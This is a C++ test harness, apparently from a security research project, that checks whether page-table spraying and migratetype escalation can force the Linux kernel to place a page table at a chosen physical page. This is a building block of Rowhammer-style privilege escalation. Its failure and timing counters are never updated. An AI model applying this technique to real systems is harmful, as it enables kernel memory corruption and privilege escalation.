/*
 * Copyright (C) 2025 Matej Bölcskei, ETH Zurich
 * Licensed under the GNU General Public License as published by the Free Software Foundation, version 3.
 * See LICENSE or <https://www.gnu.org/licenses/gpl-3.0.html> for details.
 *
 * SPDX-License-Identifier: GPL-3.0-only
 */

#include "rubench.hpp"
#include "rubicon.hpp"

#include <cstdio>
#include <fcntl.h>
#include <sys/mman.h>
#include <unistd.h>

int pt_spray_bait_allocator(void* ctx) {
    return pt_spray_tables(*static_cast<pt_spray_args_t*>(ctx));
}

int main() {
    rubench_open();

    int num_rounds       = 100;
    long long total_time = 0;
    int num_fails        = 0;
    const char* buf      = "ffffffffffffffff";

    for(int round = 0; round < num_rounds; round++) {
        printf("Round %d\n", round);

        void* pageblock = get_page_block();
        void* target = (void*)((unsigned long)pageblock + TARGET_OFFSET);
        mlock((void*)((unsigned long)target - PAGE_SIZE), 3 * PAGE_SIZE);

        int fd_shm = open("/dev/shm", O_TMPFILE | O_RDWR, S_IRUSR | S_IWUSR);
        write(fd_shm, buf, 8);
        void* file_ptr = mmap(NULL, PAGE_SIZE, PROT_READ | PROT_WRITE,
                              MAP_SHARED | MAP_POPULATE, fd_shm, 0);
        mlock(file_ptr, PAGE_SIZE);

        unsigned long file_phys = rubench_va_to_pa(file_ptr);
        unsigned long target_phys = rubench_va_to_pa(target);

        void* bait_ptr = (void*)((unsigned long)pageblock + PAGEBLOCK_SIZE / 2);

        auto spray_args = pt_spray_args_t{
            .start = (void*)SPRAY_START,
            .fd = fd_shm,
            .nr_tables = NR_PAGE_TABLES_SPRAY,
        };

        migratetype_escalation(bait_ptr, 9, pt_spray_bait_allocator,
                               &spray_args);
        pt_unspray_tables(spray_args);

        // Move the target as next candidate for page table allocation
        munlock(target, PAGE_SIZE);
        block_merge(target, 0);
        // Install the page table at the target.
        mmap(spray_args.start + PAGEBLOCK_SIZE, PAGE_SIZE,
             PROT_READ | PROT_WRITE, MAP_FIXED | MAP_SHARED | MAP_POPULATE,
             fd_shm,
             0);

        unsigned long value = rubench_read_phys(target_phys);

        printf("Pageblock physical address: %lx\n", target_phys);
        printf("File physical address: %lx\n", file_phys);
        printf("Value read from target: %lx\n", value);
        auto success = (value & 0xFFFFFFFFF000) == file_phys;

        if(success) {
            printf("PASS\n");
        } else {
            printf("FAIL\n");
        }

        munmap((void*)SPRAY_START, PAGE_SIZE);
        munmap((void*)(SPRAY_START + PAGEBLOCK_SIZE), PAGE_SIZE);
        munlock(file_ptr, PAGE_SIZE);
        munmap(file_ptr, PAGE_SIZE);
        close(fd_shm);
        munlock((void*)((unsigned long)target - PAGE_SIZE), 3 * PAGE_SIZE);
        munmap(pageblock, PAGEBLOCK_SIZE);
    }

    printf("Number of failed tests: %d\n", num_fails);
    printf("Average time taken: %lld ns\n",
           total_time / (num_rounds - num_fails));

    rubench_close();
    return 0;
}